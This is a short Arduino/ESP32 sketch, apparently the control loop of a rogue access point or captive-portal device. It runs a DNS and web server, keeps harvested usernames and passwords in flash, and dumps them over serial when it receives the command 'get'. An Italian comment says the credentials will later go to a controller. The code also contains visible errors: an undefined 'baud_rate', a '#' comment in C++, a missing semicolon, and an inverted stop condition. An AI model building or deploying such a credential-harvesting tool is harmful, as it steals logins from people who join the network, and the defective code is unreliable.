#include "web_handler.h"
#include "ap_handler.h"

// PIN setup
#define TX 43
#define RX 44
#define BAUD_RATE 9600

String received_command = "";
Preferences preferences;

void setup() {
  Serial.begin(115200);
  Serial1.begin(baud_rate, SERIAL_8N1, RX, TX);
  Serial.println("Ready to receive command via Serial1 (USART).");

  if (!SPIFFS.begin(true)) {
      Serial.println("SPIFFS mount failed!");
      return;
  }
}

void send_all_credentials() {
    preferences.begin("creds", true);
    int count = preferences.getUInt("count", 0);
    Serial1.printf("Sending %d stored credentials:\n", count);
    for (int i = 0; i < count; i++) {
        String user = preferences.getString("user" + String(i), "");
        String pass = preferences.getString("pass" + String(i), "");
        # TODO: trasmettere tramite seriale a controllore, qui faccio solo PRINT
        Serial1.println("USER:" + user + ", PASS:" + pass);
    }
    preferences.end();
}

void loop() {

  while (Serial1.available()) {
    char c = Serial1.read();
    if (c == '\n') {
      received_command.trim();
      Serial.print("Command received: ");
      Serial.println(received_command);

      if (received_command == "start" && !ap_is_active()) {
        ap_start();
      } else if (received_command == "stop" && !ap_is_active()) {
       ap_stop()
      } else if (received_command == "get" && !ap_is_active()) {
        send_all_credentials();
      }

      received_command = "";
    } 
    
    else { received_command += c; }

  }

  // solo se AP attivo, gestisci DNS e web
  if (ap_is_active()) {
    dns_server.processNextRequest();
    http_server.handleClient();
  }

  delay(10);
}

